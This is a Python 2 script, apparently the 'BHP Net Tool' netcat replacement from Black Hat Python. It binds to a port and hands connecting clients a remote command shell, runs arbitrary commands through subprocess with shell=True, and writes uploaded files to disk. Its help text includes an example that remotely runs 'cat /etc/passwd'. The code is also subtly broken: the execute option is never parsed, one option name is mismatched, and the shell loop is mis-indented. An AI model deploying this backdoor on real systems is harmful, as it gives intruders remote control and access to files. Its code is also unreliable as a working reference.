# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

# Global value
listen		= False
command		= False
upload		= False
execute		= ""
target 		= ""
upload_destination = ""
port 		= 0

# Help
def usage():
	print "BHP Net Tool"
	print
	print "Usage: bhpnet.py -t target_host -p port"
	print "-l --listen               - listen on [host]:[port] for"
	print "                            incoming connections"
	print "-e --execute=file_to_run  - execute the given file upon"
	print "                            recieving a connecton"
	print "-c --command              - initialize a command shell"
	print "-u --upload=destination   - upon recieving connection upload a"
	print "                            file and write to [destination]"
	print 
	print 
	print "Examples: "
	print "bhpnet.py -t 192.168.0.1 -p -l -c"
	print "bhpnet.py -t 192.168.0.1 -p -l -u c:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\""
	print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
	print
	sys.exit(0)

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	# Input command line option
	try:
		opts, args = getopt.getopt(
			sys.argv[1:],
			"hle:t:p:cu:",
			["help", "listen", "execute=", "target=",
			"port=", "command", "upload="])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-c", "--commandshell"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"

	# Wait connections? or Send data got by std-input?"
	if not listen and len(target) and port > 0:

		# Insert input from command line into `buffer`
		# If there is no input, the process cannot be run
		# If you don't send data in std-input, press Ctrl-D
		buffer = sys.stdin.read()
		#buffer = raw_input()	

		client_sender(buffer)

	# Start Connection
	# File upload according to command line options
	# Running command or commandshell
	if listen:
		server_loop()


def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connection to target host
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)

		while True:
			# Wait data from target host
			recv_len = 1
			response = ""

			while recv_len:
				data	 = client.recv(4096)
				recv_len = len(data)
				response += data

				if recv_len < 4096:
					break

			print response,

			# Wait additional input
			buffer = raw_input("")
			buffer += "\n"

			# Send data
			client.send(buffer)

	except:
		print "[*] Exception! Exiting."

		# Finish connection
		client.close()


def server_loop():
	global target

	# If waiting IP address is not set, 
	# it waits at all interfaces.
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	server.bind((target, port))

	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# Start thread processing new connections from client
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):
	# Delete enter at end of string
	command = command.rstrip()
	print command
	# Run the command and get the output
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\n"
	print output
	# Send output to client
	return output


def client_handler(client_socket):
	global upload
	global execute
	global command

	# Check whether file-upload is set
	if len(upload_destination):

		# Read all data, and write data on assigned file
		file_buffer = ""

		# Keep recieving data to the end
		while True:
			data = client_socket.recv(1024)

			if len(data) == 0:
				break
			else:
				file_buffer += data

		# Write recieved data on a file
		try:
			file_descriptor = open(upload_destination,"wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			# Tell success/fail of writing file
			client_socket.send("Successfully saved file to %s\n" % upload_destination)
		except:
			client_socket.send("Failed to save to %s\n" % upload_destination)

	# Check whether command running is set
	if len(execute):
		# Run the command
		output = run_command(execute)

		client_socket.send(output)

	# Process in case running command-shell is set
	if command:

		# Display the prompt
		prompt = "<BHP:#> "
		client_socket.send(prompt)

		while True:

			# Recieve data until get enter
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
				print cmd_buffer
				print "in"
				# Get the result of command
				response = run_command(cmd_buffer)
				response += prompt

				# Send the result
				client_socket.send(response)



main()
